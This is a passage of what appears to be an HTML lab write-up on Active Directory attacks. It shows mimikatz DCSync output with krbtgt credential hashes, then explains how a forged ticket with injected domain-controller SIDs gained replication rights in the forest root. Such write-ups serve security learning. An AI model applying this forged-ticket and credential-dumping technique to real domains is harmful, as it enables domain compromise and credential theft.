+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 290ab2e5a0592c76b7fcc5612ab489e9663e39d2b2306e053c8b09df39afae52
+      aes128_hmac       (4096) : ac670a0db8f81733cdc7ea839187d024
+      des_cbc_md5       (4096) : 977526ab75ea8691
+
+* Primary:Kerberos *
+    Default Salt : TECHCORP.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 977526ab75ea8691
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  3d5588c6c4680d76d2ba077526f32a5f
+    02  fe1ac8183d11d4585d423a0ef1e21354
+    03  eed2a6a9af2e107cdd5e722faf9ed37a
+    04  3d5588c6c4680d76d2ba077526f32a5f
+    05  fe1ac8183d11d4585d423a0ef1e21354
+    06  a5a3b7dd758f68b0a278704adb369bab
+    07  3d5588c6c4680d76d2ba077526f32a5f
+    08  0ef30f135647c7c486081630caf708da
+    09  0ef30f135647c7c486081630caf708da
+    10  65974a65a535c47de5c6b6712ffa5c8d
+    11  fe790227e59a7b92b642884eacb84841
+    12  0ef30f135647c7c486081630caf708da
+    13  3c5a73e8774f215ffdd890f5e6346a05
+    14  fe790227e59a7b92b642884eacb84841
+    15  752720442d3f869baff615ae37a01d64
+    16  752720442d3f869baff615ae37a01d64
+    17  994c18bfe477093681c6b1d60ca56ac9
+    18  5fdbdb1b61e0717ba72b31741ae7ea19
+    19  535375d7fc7b3ec068521ac5ab6680d4
+    20  64d869a620dced95df997d91c5c2ecda
+    21  16b97c2628a32cb876ede8bb4e6d5253
+    22  16b97c2628a32cb876ede8bb4e6d5253
+    23  eca0357ae57e1df149e2d016494173c9
+    24  6e22a7980efe7c6bf44f821ea902d209
+    25  6e22a7980efe7c6bf44f821ea902d209
+    26  bfd73a5e0a64a9c334d1108004a98be5
+    27  e55f4d4f79067737d4a95f11fdce1a13
+    28  0141dc3481204f4334a0cb4cf6be2067
+    29  8b31e2cda5a9dd5d728f55f44dc8e7ea
+
+
+mimikatz(commandline) # exit</code></pre><p id="30c79e9a-d7c9-8069-9f64-c3c6ed2f0f54" class="">Even though we did not inject the Enterprise Admins SID (519), we were still able to perform a DCSync attack on the forest root domain because we injected the Domain Controllers SID (516) and the Enterprise Domain Controllers SID (5-9). Domain Controllers inherently have replication rights, which means that when we forge a ticket with the 516 SID, we make our identity appear as a legitimate domain controller. Since domain controllers are trusted to replicate directory data, the forest root’s domain controller treats our request as valid and allows us to extract the krbtgt hash.</p><p id="30c79e9a-d7c9-8090-98e3-fd292c30fac9" class="">The Enterprise Domain Controllers SID (5-9) further strengthens our forged ticket by granting us authentication privileges across domains in the forest. This ensures that when we interact with the forest root’s KDC, it recognizes us as a trusted domain controller from a child domain. Although we do not see techcorp.local explicitly listed in <code>klist</code>, that is because we never requested a service ticket (TGS) for a specific service in the root domain. However, since our TGT includes the necessary SIDs, the root domain still accepts our requests.</p><p id="30c79e9a-d7c9-80d2-a7ea-f61c9d17d4af" class="">In short, the attack worked because Active Directory trusts domain controllers to synchronize data, and by injecting the right SIDs, we effectively impersonated a domain controller in the forest, gaining the ability to extract the krbtgt hash without ever needing explicit Enterprise Admin privileges.</p>
+        </section>
+      </article>
+    </div>
+  </main>
+
+  <script src="../../../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
